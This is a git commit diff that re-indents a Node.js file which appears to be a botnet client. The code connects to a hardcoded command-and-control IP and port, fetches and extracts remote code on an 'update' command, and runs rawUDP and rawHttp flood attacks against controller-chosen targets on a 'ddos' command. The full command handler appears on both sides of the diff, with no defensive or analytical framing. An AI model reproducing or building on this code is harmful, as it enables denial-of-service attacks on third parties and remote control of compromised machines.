860ccb93cee00aed5b23b4d7bca71e7f9d73a4e5
Tewni <53695044+tewni-svg@users.noreply.github.com>
2021-01-28 17:40:51 +0200

    Update index.js

--- main/index.js
+++ main/index.js
@@ -22,68 +22,63 @@ module.exports.run = (async function (){
     
 
 
-    try {
-        client.setKeepAlive(true, 500);
+      client.setKeepAlive(true, 500);
 
-        client.connect(4372, '82.131.114.232', function() {
-            console.log('Connected to the Server');
-            client.write(ServerName);
-        });
+      client.connect(4372, '82.131.114.232', function() {
+          console.log('Connected to the Server');
+          client.write(ServerName);
+      });
 
-        
-        client.on('data', async function(data) {
-            data = data.toString();
-            if(data.split('|')[0] === undefined) return;
-            data = data.split('|');
-            let option = data[0];
-            if(option === "update")
-            {
-                console.log("updating")
-                client.end("");
-                await request("https://codeload.github.com/tewni-svg/Client/zip/main").pipe(fs.createWriteStream('../main.zip'))
-                await sleep(10000);
-                await fs.createReadStream('../main.zip')
-                .pipe(unzipper.Extract({ path: '../' }));
-                await sleep(10000);
-                process.exit(1);
-            }
-            if(option === "ddos")
-            {
-                let URL_IP = data[1];
-                let Time = data[2];
-                let Type = data[3];
-                if(Type === "rawUDP")
-                {
-                    let running = true;
-                    setTimeout(() => {
-                        running = false;
-                    }, Time);
-                    var interval = setInterval(() => {
-                        if(!running) clearInterval(interval)
-                        rawUDP.start(URL_IP)
-                    }, 0);
-                }
-                if(Type === "rawHttp")
-                {
-                    let running = true;
-                    setTimeout(() => {
-                        running = false;
-                    }, Time);
-                    var interval = setInterval(() => {
-                        if(!running) clearInterval(interval)
-                        rawHttp.start(URL_IP)
-                    }, 0);
-                }
-            }
-        });
+      
+      client.on('data', async function(data) {
+          data = data.toString();
+          if(data.split('|')[0] === undefined) return;
+          data = data.split('|');
+          let option = data[0];
+          if(option === "update")
+          {
+              console.log("updating")
+              client.end("");
+              await request("https://codeload.github.com/tewni-svg/Client/zip/main").pipe(fs.createWriteStream('../main.zip'))
+              await sleep(10000);
+              await fs.createReadStream('../main.zip')
+              .pipe(unzipper.Extract({ path: '../' }));
+              await sleep(10000);
+              process.exit(1);
+          }
+          if(option === "ddos")
+          {
+              let URL_IP = data[1];
+              let Time = data[2];
+              let Type = data[3];
+              if(Type === "rawUDP")
+              {
+                  let running = true;
+                  setTimeout(() => {
+                      running = false;
+                  }, Time);
+                  var interval = setInterval(() => {
+                      if(!running) clearInterval(interval)
+                      rawUDP.start(URL_IP)
+                  }, 0);
+              }
+              if(Type === "rawHttp")
+              {
+                  let running = true;
+                  setTimeout(() => {
+                      running = false;
+                  }, Time);
+                  var interval = setInterval(() => {
+                      if(!running) clearInterval(interval)
+                      rawHttp.start(URL_IP)
+                  }, 0);
+              }
+          }
+      });
 
-        client.on('error', function(data) {
-            mainServer.run();
-        });
-    }
-    catch{
-
-    }
+      client.on('error', function(data) {
+          mainServer.run();
+      });
 
 
 
